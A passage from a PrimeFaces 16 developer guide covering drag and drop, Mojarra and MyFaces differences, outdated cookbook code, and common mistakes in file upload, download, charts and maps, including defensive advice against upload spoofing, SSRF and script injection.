  • Give pointer-free users another route. Dragging is a mouse and touch gesture. The example keeps an "Add to shelf" button on every card and a "Remove" button in the table, which call the same bean methods. Keyboard-only access to the drag was not tested.

  • Other drag and drop in PrimeFaces. p:fileUpload accepts dropped files (dragDrop, dropZone; see The user interface); data tables can reorder rows and columns by dragging; p:pickList, p:orderList, trees (TreeDragDropEvent), p:dashboard (p:draggable has a dashboard attribute) and the timeline and organigram components have their own events. They are covered on the data components page of this section and in the PrimeFaces documentation.

Mojarra and MyFaces

Everything on this page was run on both Mojarra 4.1.17 and MyFaces Core 4.1.4 unless it says otherwise, and the results matched: the upload messages and the container’s 413, the simple and advanced modes, the headers of the five download buttons, the streamed images, the crop result, the camera capture, the chart click, the chart script injection and its fix, the map’s info window update and the drag and drop. The differences that showed up are small:

  • Exceptions from forged drop ids. An index past the end of the list raised jakarta.faces.model.NoRowAvailableException on Mojarra and java.lang.IllegalArgumentException on MyFaces. Both are unexpected exceptions for the ExceptionHandler; handle them the same way.

  • Lifecycle detail that matters for tests. When a test posts a command by hand, MyFaces expects the form’s hidden <formId>_SUBMIT field and Mojarra does not (see the file upload page). A browser sends it, and the scripted checks of this page used a browser wherever a button was clicked.

  • The library is the same. The PrimeFaces 16 jar is one artifact for both implementations; the component, renderer and widget code is identical, which is why the behaviour above matches. PrimeFaces' own CSP support (the primefaces.CSP parameter) also works on both, whereas Mojarra’s built-in nonce option has no MyFaces counterpart (see Content Security Policy).

Where the Books Are Outdated

PrimeFaces Cookbook, Second Edition by Mert Çalışkan and Oleg Varaksin (Packt, May 2015) was written for PrimeFaces 5.1 and 5.2 on JSF 2.2. For the topics of this page the book’s chapters cover file upload and download, image cropping and photo capture, drag and drop, charts and maps. The ideas still hold (a widget that uploads in the background, a component that crops, a drop target), but most of the code needs to change:

  • Uploads. In PrimeFaces 5 the listener attribute was fileUploadListener (renamed listener in 8.0), the limits were attributes of p:fileUpload itself (sizeLimit, allowTypes, fileLimit; they became p:validateFile in 14.0.0 and were removed in 15.0.0), and the uploader could run on Apache Commons FileUpload (deprecated in 14.0.0 and deleted in 15.0.0, leaving the Servlet multipart API). The model methods were renamed (getContents to getContent, getInputstream to getInputStream). The checks that matter today (content-type detection, a limit on chunked uploads, virus scanning, safe file names) were not part of that era’s recipes.

  • Downloads and dynamic images. new DefaultStreamedContent(stream, type, name) and ByteArrayContent were replaced by DefaultStreamedContent.builder() in 8.0, and Ajax downloads work without ajax="false" since 10.0. Streaming rules (request scoped beans, f:param) are described in How the Ajax download and the images are fetched.

  • Image cropper and camera. The cropper’s JavaScript library changed (JCrop to Cropper.js in 8.0) and the Flash camera fallback was removed in 11.0.0; a camera now needs HTTPS.

  • Charts. The charts of that edition are the jqPlot-based ones. They were deprecated in 10.0 in favour of Chart.js models, the jqPlot component was deleted in 13.0.0 and the Chart.js component family of 10.0 to 14.0 in 15.0.0. The 16 component takes Chart.js JSON (Charts: p:chart).

Common Mistakes

  • Trusting the file chooser. accept, allowTypes and the declared content type are all client data. allowTypes is satisfied by a matching declared type. Combine contentType="true", a real detector library and your own signature check.

  • contentType="true" without accept. The content check is skipped.

  • No detector library. The JDK default may decide from the extension and accept a text file named x.png.

  • Chunked uploads without sizeLimit. The container’s limit applies per chunk, not to the merged file.

  • UploadedFile.write(dir) or the submitted name as a path. PrimeFaces rejects ../ and /, but the client still picks the file name; generate it.

  • A view scoped bean behind p:fileUpload multiple, p:fileDownload or a streaming p:graphicImage. The requests are parallel or separate; use request scope.

  • An expression with arguments in streaming mode. #{bean.image(id)} fails; use a property and f:param, or stream="false".

  • A cropper image expression that only works in the render request. It is evaluated again in the postback.

  • image built from user input in p:imageCropper. The server fetches http URLs: SSRF.

  • Putting text from users into p:chart JSON without escaping <. Script injection; escape and use a CSP.

  • A shared map model. Marker drags change the model; keep it per view or per user.

  • Drag and drop as the only way. Provide a button for the same action.

  • Missing libraries on Tomcat. jakarta.xml.bind-api for p:photoCam, a detector for the content check.

  • Forgetting enctype="multipart/form-data" on a simple-mode form. The file never arrives.

  • Keys in web.xml in the repository (primefaces.virusscan.VIRUSTOTAL_KEY, a Maps key): read them from the environment or a secret store.
